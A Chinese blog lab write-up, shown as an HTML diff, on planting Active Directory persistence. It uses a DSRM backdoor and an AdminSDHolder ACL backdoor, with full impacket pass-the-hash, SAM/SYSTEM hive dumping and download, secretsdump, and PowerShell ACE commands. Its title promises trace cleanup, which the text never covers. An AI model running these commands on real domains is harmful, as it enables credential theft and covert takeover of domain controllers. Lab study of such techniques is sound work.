@@ -1,0 +1,926 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.概念和原理1.1 DSRM后门 – 目录服务还原模式原理DSRM(Directory Services Restore Mode)是域控的离线修复模式。DC的本地SAM中有一个独立的Administrator账户（RID 500），密码在DC提升时设置，与域Administrator完全独立。攻击者无需改密码，直接dump本地SAM拿到hash，配合DSRMAdminLogonBehavior">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验：内网权限维持痕迹清理">
+<meta property="og:url" content="https://chiya-66.github.io/2026/10/12/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="1.概念和原理1.1 DSRM后门 – 目录服务还原模式原理DSRM(Directory Services Restore Mode)是域控的离线修复模式。DC的本地SAM中有一个独立的Administrator账户（RID 500），密码在DC提升时设置，与域Administrator完全独立。攻击者无需改密码，直接dump本地SAM拿到hash，配合DSRMAdminLogonBehavior">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-28.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-29.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-30.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-31.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-32.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-33.png">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/image-34.png">
+<meta property="article:published_time" content="2026-10-12T13:36:14.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.374Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/notes/image-28.png">
+  
+  
+  
+  <title>实验：内网权限维持痕迹清理 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="实验：内网权限维持痕迹清理"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-10-12 21:36" pubdate>
+          2026年10月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">实验：内网权限维持痕迹清理</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-概念和原理"><a href="#1-概念和原理" class="headerlink" title="1.概念和原理"></a>1.概念和原理</h2><h3 id="1-1-DSRM后门-–-目录服务还原模式原理"><a href="#1-1-DSRM后门-–-目录服务还原模式原理" class="headerlink" title="1.1 DSRM后门 – 目录服务还原模式原理"></a>1.1 DSRM后门 – 目录服务还原模式原理</h3><p>DSRM(Directory Services Restore Mode)是域控的离线修复模式。DC的本地SAM中有一个独立的Administrator账户（RID 500），密码在DC提升时设置，与域Administrator完全独立。攻击者无需改密码，直接dump本地SAM拿到hash，配合DSRMAdminLogonBehavior&#x3D;2即可远程登录DC——真正意义上的”第二条命”后门。</p>
+<h3 id="1-2-AdminSDHolder-ACL-–-权限传播后门原理"><a href="#1-2-AdminSDHolder-ACL-–-权限传播后门原理" class="headerlink" title="1.2 AdminSDHolder ACL – 权限传播后门原理"></a>1.2 AdminSDHolder ACL – 权限传播后门原理</h3><p>AdminSDHolder是AD中的一个特殊容器（CN&#x3D;AdminSDHolder,CN&#x3D;System）。它的ACL作为模板，由SDProp进程定期（默认60分钟）自动复制到所有受保护的安全主体上：Domain Admins、Enterprise Admins、Administrator、Schema Admins等。攻击者只需修改AdminSDHolder的ACL一次，60分钟后权限自动扩散到全部受保护组——极其隐蔽。</p>
+<p>实验对象 <code>testuser</code>（2026-07-24 创建，Domain Users 普通成员）目前对三个受保护组没有任何权限——这是实验基线。本步的三个观察，是为了让后面每一步变化都有对照。</p>
+<h2 id="2-实验过程"><a href="#2-实验过程" class="headerlink" title="2.实验过程"></a>2.实验过程</h2><h3 id="2-1-实验所需的工具和设备"><a href="#2-1-实验所需的工具和设备" class="headerlink" title="2.1 实验所需的工具和设备"></a>2.1 实验所需的工具和设备</h3><ul>
+<li><p><strong>工具：</strong> mimikatz , impacket</p>
+</li>
+<li><p><strong>设备：</strong> DC kali</p>
+</li>
+</ul>
+<h3 id="2-2-实验大致流程"><a href="#2-2-实验大致流程" class="headerlink" title="2.2 实验大致流程"></a>2.2 实验大致流程</h3><h3 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h3><h4 id="1-导出注册表"><a href="#1-导出注册表" class="headerlink" title="1.导出注册表"></a>1.导出注册表</h4><p>先找出先前通过mimikaz导出的管理员的hash，然后通过PTH进行远程登录DC并执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>  saionjisekai/Administrator@192.168.41.131 \<br>  <span class="hljs-string">&#x27;reg save HKLM\SAM C:\Windows\Temp\sam.save /y&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>  saionjisekai/Administrator@192.168.41.131 \<br>  <span class="hljs-string">&#x27;reg save HKLM\SYSTEM C:\Windows\Temp\sys.save /y&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-28.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="2-将注册表下载到kali并解析DSRM-hash"><a href="#2-将注册表下载到kali并解析DSRM-hash" class="headerlink" title="2.将注册表下载到kali并解析DSRM hash"></a>2.将注册表下载到kali并解析DSRM hash</h4><p>首先将注册表下载到kali上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali上执行：通过smbclient下载注册表文件</span><br>smbclient -m SMB3 \<br>  -U <span class="hljs-string">&#x27;saionjisekai/administrator%55a687fc23323f7c66484e6e7a021479&#x27;</span> \<br>  --pw-nt-hash //192.168.41.131/ADMIN$ \<br>  -c <span class="hljs-string">&#x27;prompt; get Temp\sam.save /tmp/sam.save; get Temp\sys.save /tmp/sys.save&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-29.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后对DSRM的hash进行解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali本地解析SAM文件，提取DSRM Administrator的NTLM hash</span><br>impacket-secretsdump -sam /tmp/sam.save -system /tmp/sys.save LOCAL<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-30.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<blockquote>
+<p><strong>关键数据：DSRM Administrator NTLM hash &#x3D;</strong> <strong><code>e19ccf75ee54e06b06a5907af13cef42</code></strong>（Admin后面的第二段hash）</p>
+<p>注意这个hash与域Administrator的hash完全不同——两者是独立存储的。</p>
+</blockquote>
+<h4 id="3-启用DSRM远程登录"><a href="#3-启用DSRM远程登录" class="headerlink" title="3.启用DSRM远程登录"></a>3.启用DSRM远程登录</h4><blockquote>
+<p><strong>运行位置：Kali → proxychains → wmiexec(仅hash) → DC PowerShell</strong></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali上执行：设置注册表允许DSRM远程登录（0=禁止 1=服务停时允许 2=始终允许）</span><br>impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>  saionjisekai/Administrator@192.168.41.131 \<br>  <span class="hljs-string">&#x27;powershell -c &quot;Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name DSRMAdminLogonBehavior -Value 2 -Type DWORD -Force; Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name DSRMAdminLogonBehavior&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-31.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="4-验证DSRM后门"><a href="#4-验证DSRM后门" class="headerlink" title="4. 验证DSRM后门"></a>4. 验证DSRM后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali上执行：用DSRM hash登录DC</span><br><span class="hljs-comment"># 注意：用户名前的域部分是DC主机名 WIN-P2AAOUO80MG，不是域名</span><br>impacket-wmiexec -codec gbk -hashes :e19ccf75ee54e06b06a5907af13cef42 \<br>  WIN-P2AAOUO80MG/administrator@192.168.41.131 <span class="hljs-string">&#x27;whoami&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 同时也验证smbclient（通过SMB访问DC文件共享）</span><br>smbclient -m SMB3 \<br>  -U <span class="hljs-string">&#x27;WIN-P2AAOUO80MG/administrator%e19ccf75ee54e06b06a5907af13cef42&#x27;</span> \<br>  --pw-nt-hash //192.168.41.131/ADMIN$ -c <span class="hljs-string">&#x27;ls&#x27;</span> | <span class="hljs-built_in">head</span> -5<br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-32.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="DSRM后门总结"><a href="#DSRM后门总结" class="headerlink" title="DSRM后门总结"></a>DSRM后门总结</h4><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th align="center">域 Administrator</th>
+<th align="center">DSRM Administrator</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>存储位置</td>
+<td align="center">NTDS.dit（AD数据库）</td>
+<td align="center">本地SAM注册表</td>
+</tr>
+<tr>
+<td>NTLM Hash</td>
+<td align="center"><code>55a687fc23323f7c66484e6e7a021479</code>（域管）</td>
+<td align="center"><code>e19ccf...</code>（DSRM 本地）</td>
+</tr>
+<tr>
+<td>登录格式</td>
+<td align="center"><code>saionjisekai\Administrator</code></td>
+<td align="center"><code>WIN-P2AAOUO80MG\Administrator</code></td>
+</tr>
+<tr>
+<td>域管改密码</td>
+<td align="center">DSRM不受影响</td>
+<td align="center">域管不受影响</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>后门价值</strong>：DSRM账号与域完全隔离，域管理员改密码、删账户都无法影响它。只要DC不重装，这个hash永远有效。</p>
+<p><strong>稳定性实证（第二次复现实测）</strong>：域管 hash 已从 <code>55a687fc...</code> 变更，而 DSRM hash 两次解析均为 <code>e19ccf...</code>、bootKey 不变——域侧凭据怎么变，本地 SAM 纹丝不动。</p>
+</blockquote>
+<hr>
+<h3 id="AdminSDHolder-ACL-–-权限传播后门"><a href="#AdminSDHolder-ACL-–-权限传播后门" class="headerlink" title="AdminSDHolder ACL – 权限传播后门"></a>AdminSDHolder ACL – 权限传播后门</h3><h4 id="1-给模板添加-testuser-的-GenericAll-ACE"><a href="#1-给模板添加-testuser-的-GenericAll-ACE" class="headerlink" title="1.  给模板添加 testuser 的 GenericAll ACE"></a>1.  给模板添加 testuser 的 GenericAll ACE</h4><blockquote>
+<p>一条 ACE 由四要素构成：主体（testuser）+ 权限（GenericAll）+ 类型（Allow）+ 继承（All）。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali上执行：通过wmiexec在DC上运行PowerShell修改AdminSDHolder ACL</span><br><span class="hljs-comment"># 给testuser添加GenericAll权限</span><br>impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>  saionjisekai/administrator@192.168.41.131 \<br>  <span class="hljs-string">&#x27;powershell -c &quot;$sd=[ADSI]\&quot;LDAP://CN=AdminSDHolder,CN=System,DC=saionjisekai,DC=org\&quot;; $acl=$sd.ObjectSecurity; $id=[System.Security.Principal.NTAccount]\&quot;saionjisekai\testuser\&quot;; $r=[System.DirectoryServices.ActiveDirectoryRights]::GenericAll; $t=[System.Security.AccessControl.AccessControlType]::Allow; $inh=[System.DirectoryServices.ActiveDirectorySecurityInheritance]::All; $ace=New-Object System.DirectoryServices.ActiveDirectoryAccessRule($id,$r,$t,$inh); $acl.AddAccessRule($ace); $sd.ObjectSecurity=$acl; $sd.CommitChanges(); Write-Host \&quot;[+] AdminSDHolder ACL modified\&quot;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-33.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="2-回读验证ACL修改成功"><a href="#2-回读验证ACL修改成功" class="headerlink" title="2.回读验证ACL修改成功"></a>2.回读验证ACL修改成功</h4><blockquote>
+<p><strong>引号规则</strong>：外层用单引号 <code>&#39;...&#39;</code> 时，bash 不会展开里面的任何 <code>$</code>，所以 <code>$sd</code>、<code>$acl</code>、<code>$_.IdentityReference</code> 一律裸写；只有双引号需要写成 <code>\&quot;</code>。把 <code>$_</code> 写成 <code>\$</code> 会让 PowerShell 把 <code>\$_.IdentityReference</code> 当成命令名，报”无法识别 cmdlet”。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在Kali上执行：回读AdminSDHolder ACL，确认testuser已添加</span><br>impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>  saionjisekai/administrator@192.168.41.131 \<br>  <span class="hljs-string">&#x27;powershell -c &quot;$sd=[ADSI]\&quot;LDAP://CN=AdminSDHolder,CN=System,DC=saionjisekai,DC=org\&quot;; $acl=$sd.ObjectSecurity; $acl.GetAccessRules($true,$true,[System.Security.Principal.NTAccount]) | Where-Object &#123; $_.IdentityReference -match \&quot;testuser\&quot; &#125; | Format-List&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/notes/image-34.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
+<h4 id="3-等待-SDProp-传播（实测结论：触发不了，只能等周期）"><a href="#3-等待-SDProp-传播（实测结论：触发不了，只能等周期）" class="headerlink" title="3.等待 SDProp 传播（实测结论：触发不了，只能等周期）"></a>3.等待 SDProp 传播（实测结论：触发不了，只能等周期）</h4><blockquote>
+<p><code>dSCorePropagationData</code> 属于纪元属性，”非法写触发法”在新版本 DC 上已被堵死——报错并不代表触发成功。<strong>真正让传播发生的是 SDProp 自己的周期调度</strong>：只要模板 DACL 变过，它会在自己的下一轮周期里把模板刷到所有受保护组。本环境实测传播快则约 2 分钟，周期上限 60 分钟。</p>
+</blockquote>
+<p><strong>等待传播的轮询命令</strong>（每 60s 执行一次 6.2.0 的基线检查脚本，最多 40 轮）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 40); <span class="hljs-keyword">do</span><br>  impacket-wmiexec -codec gbk -hashes :55a687fc23323f7c66484e6e7a021479 \<br>    <span class="hljs-string">&#x27;saionjisekai/administrator@192.168.41.131&#x27;</span> \<br>    <span class="hljs-string">&#x27;powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\step.ps1&#x27;</span> 2&gt;/dev/null | grep -E <span class="hljs-string">&#x27;FOUND|clean&#x27;</span><br>  <span class="hljs-built_in">sleep</span> 60<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<h4 id="6-2-4-后门效果"><a href="#6-2-4-后门效果" class="headerlink" title="6.2.4 后门效果"></a>6.2.4 后门效果</h4><p>SDProp传播完成后，testuser 对以下所有受保护组拥有 GenericAll 权限：</p>
+<table>
+<thead>
+<tr>
+<th>受保护组</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Domain Admins</td>
+<td>可以添加&#x2F;删除成员</td>
+</tr>
+<tr>
+<td>Enterprise Admins</td>
+<td>控制整个林的管理组</td>
+</tr>
+<tr>
+<td>Administrators</td>
+<td>DC本地管理员组</td>
+</tr>
+<tr>
+<td>Schema Admins</td>
+<td>控制AD架构</td>
+</tr>
+<tr>
+<td>krbtgt</td>
+<td>控制Kerberos密钥分发账户</td>
+</tr>
+</tbody></table>
+<p><strong>这意味着：testuser可以将自己加入Domain Admins，可以重置任何域管理员的密码，拥有完整的域控制权，而且这些权限不在testuser的直接memberOf中——非常隐蔽。</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="category-chain-item">安全笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>实验：内网权限维持痕迹清理</div>
+      <div>https://chiya-66.github.io/2026/10/12/实验：内网权限维持痕迹清理/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年10月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/10/16/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="实验：内网渗透测试">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">实验：内网渗透测试</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/10/01/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F/" title="实验：域渗透">
+                        <span class="hidden-mobile">实验：域渗透</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
